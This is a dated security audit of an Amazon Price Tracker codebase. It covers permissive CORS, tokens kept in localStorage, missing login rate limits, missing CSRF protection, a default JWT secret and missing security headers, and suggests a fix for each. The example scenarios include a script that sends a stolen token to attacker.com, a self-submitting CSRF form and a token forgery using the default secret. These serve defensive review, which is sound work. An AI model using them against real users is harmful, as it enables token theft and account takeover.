# Improvements & Optimization Opportunities

**Date:** 2026-04-10
**Purpose:** Point-in-time audit of the Amazon Price Tracker codebase identifying potential issues, optimization opportunities, and areas for improvement. Each item includes current behavior analysis with code references, impact assessment, and concrete fix suggestions.

**Severity Scale:**
- **Critical** — Security vulnerability or data loss risk requiring immediate attention
- **High** — Significant limitation affecting reliability, scalability, or security
- **Medium** — Improvement that would meaningfully benefit the application
- **Low** — Nice-to-have optimization or best practice alignment

---

## 1. Security

The application implements core security fundamentals (bcrypt password hashing, JWT authentication, parameterized SQL queries, user data isolation). However, several areas could be hardened — particularly around CORS, token storage, and rate limiting — especially as the app moves toward multi-user production use.

### 1.1 `[High]` CORS Allows All Origins

**Current behavior:** The Express server accepts requests from any origin.

```typescript
// backend/src/server.ts:25-30
app.use(cors({
  origin: true,  // Allow all origins in development
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

**Impact:** Any website can make authenticated API requests on behalf of a logged-in user. If an attacker hosts a malicious page and a user visits it while logged in, the attacker's JavaScript can call the API with the user's credentials — reading their product data, triggering scrapes, modifying settings, or (for admins) managing other users.

**Example scenario:** A user visits `evil-site.com` while logged into the tracker. The page runs:
```javascript
fetch('https://tracker.example.com/api/products', {
  credentials: 'include',
  headers: { 'Authorization': 'Bearer ' + storedToken }
})
```
This succeeds because the server returns `Access-Control-Allow-Origin: evil-site.com`.

**Suggested fix:** Configure allowed origins from an environment variable with a safe default:
```typescript
const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',')
  : ['http://localhost:5174'];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS not allowed'));
    }
  },
  credentials: true,
}));
```

### 1.2 `[High]` JWT Stored in localStorage

**Current behavior:** The JWT token is stored in and read from `localStorage`.

```typescript
// frontend/src/contexts/AuthContext.tsx:43
const storedToken = localStorage.getItem('authToken');

// frontend/src/contexts/AuthContext.tsx:66
localStorage.setItem('authToken', response.token);
```

**Impact:** `localStorage` is accessible to any JavaScript running on the same origin. If an XSS vulnerability exists anywhere in the app (e.g., unsanitized user input rendered in the DOM, a compromised dependency, or a browser extension), the attacker can read the JWT and use it from any location — the token works until it expires (7 days by default).

**Example scenario:** A browser extension or injected script runs:
```javascript
const token = localStorage.getItem('authToken');
fetch('https://attacker.com/steal?token=' + token);
```
The attacker now has full API access for up to 7 days.

**Suggested fix:** Move to `httpOnly` cookies for token storage. The backend sets the cookie on login:
```typescript
res.cookie('token', jwt, {
  httpOnly: true,    // JavaScript cannot read it
  secure: true,      // HTTPS only
  sameSite: 'strict', // No cross-site requests
  maxAge: 7 * 24 * 60 * 60 * 1000
});
```
The frontend stops storing/sending tokens manually — the browser sends the cookie automatically. This requires updating the auth middleware to read from `req.cookies` instead of the `Authorization` header.

### 1.3 `[Medium]` No Rate Limiting on Login/Register

**Current behavior:** The `/api/auth/login` and `/api/auth/register` endpoints have no rate limiting. Only `/api/admin/*` and `/api/setup/*` routes are rate-limited.

```typescript
// backend/src/routes/admin.ts:10-16 — rate limited
const adminRateLimit = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
});

// backend/src/routes/auth.ts — NO rate limiter imported or applied
router.post('/login', async (req, res) => { ... });
router.post('/register', async (req, res) => { ... });
```

**Impact:** An attacker can attempt unlimited login attempts to brute-force passwords. With no delay or lockout, even a moderately strong password can be cracked given enough time. Similarly, unrestricted registration could be used to create spam accounts.

**Example scenario:** An automated script sends 1000 login attempts per second against a known username, cycling through a password dictionary. With no rate limiting, this runs unimpeded.

**Suggested fix:** Add rate limiting to auth routes:
```typescript
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20,                   // 20 attempts per window
  message: { error: 'Too many attempts. Please try again later.' },
  standardHeaders: true,
});

router.post('/login', authLimiter, async (req, res) => { ... });
router.post('/register', authLimiter, async (req, res) => { ... });
```

### 1.4 `[Medium]` No CSRF Protection

**Current behavior:** State-changing requests (POST, PUT, DELETE) have no CSRF token validation. The app relies on the `Authorization` header for authentication, which provides some implicit CSRF protection since browsers don't automatically send custom headers cross-origin. However, if CORS is permissive (see item 1.1) or if token storage moves to cookies (see item 1.2), CSRF becomes a real attack vector.

**Impact:** If CORS is fixed but tokens move to httpOnly cookies (recommended in item 1.2), cross-site requests would automatically include the cookie. Without CSRF protection, a malicious page could trigger state changes (delete products, change passwords) on behalf of a logged-in user.

**Example scenario:** After moving to httpOnly cookies, a page at `evil-site.com` includes:
```html
<form action="https://tracker.example.com/api/products/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>
```

**Suggested fix:** Implement the Synchronizer Token Pattern or use the `csurf` middleware (or its successor `csrf-csrf`). Alternatively, use the `SameSite=Strict` cookie attribute (as suggested in 1.2) which blocks cross-site cookie sending entirely — this is often sufficient for same-origin SPAs.

### 1.5 `[Medium]` JWT Secret Has a Working Default

**Current behavior:** The JWT secret defaults to a known string in development. The app warns but continues running.

```typescript
// backend/src/config.ts:32-39
const jwtSecret = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
if (isProduction && jwtSecret === 'your-secret-key-change-in-production') {
  console.error('FATAL: ...');
  process.exit(1);
}
if (jwtSecret === 'your-secret-key-change-in-production') {
  console.warn('WARNING: Using default JWT_SECRET...');
}
```

**Impact:** In development, any developer who knows the codebase can forge JWT tokens. If someone accidentally runs the dev config exposed to the network (e.g., via Tailscale without realizing), tokens can be forged by anyone who reads the source code. The production guard is good, but the dev default is still risky for Tailscale-accessible instances.

**Example scenario:** A developer runs the app on Tailscale without setting `NODE_ENV=production`. Another Tailscale user crafts a valid JWT:
```javascript
jwt.sign({ userId: 1, username: 'admin', role: 'ADMIN' },
         'your-secret-key-change-in-production', { expiresIn: '7d' });
```

**Suggested fix:** Generate a random secret on first run and persist it to a `.env` file or the database's `system_config` table. This way every installation has a unique secret even in development. The setup wizard could handle this automatically.

### 1.6 `[Low]` No Security Headers

**Current behavior:** No security-related HTTP headers are set. There's no Helmet middleware or manual header configuration.

**Impact:** The application is missing standard protections:
- No `Content-Security-Policy` — allows inline scripts, which aids XSS attacks
- No `X-Frame-Options` / `frame-ancestors` — the app can be embedded in iframes (clickjacking)
- No `Strict-Transport-Security` — browsers don't enforce HTTPS on subsequent visits
- No `X-Content-Type-Options` — browsers may MIME-sniff responses incorrectly

**Example scenario:** An attacker embeds the tracker in an iframe on their site, overlays invisible buttons, and tricks users into clicking actions they didn't intend (clickjacking).

**Suggested fix:** Install and configure Helmet:
```bash
npm install helmet
```
```typescript
import helmet from 'helmet';
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      imgSrc: ["'self'", "https://m.media-amazon.com", "https://images-na.ssl-images-amazon.com"],
      scriptSrc: ["'self'"],
    },
  },
}));
```

### Recommended Next Steps
1. **Immediate:** Add rate limiting to `/api/auth/login` and `/api/auth/register` — low effort, high security impact
2. **Immediate:** Restrict CORS origins via environment variable — low effort, closes the biggest hole
3. **Short-term:** Add Helmet for security headers — one dependency, broad protection
4. **Medium-term:** Migrate token storage to httpOnly cookies with `SameSite=Strict` — closes XSS token theft and CSRF simultaneously
5. **Medium-term:** Auto-generate JWT secret on first run via setup wizard
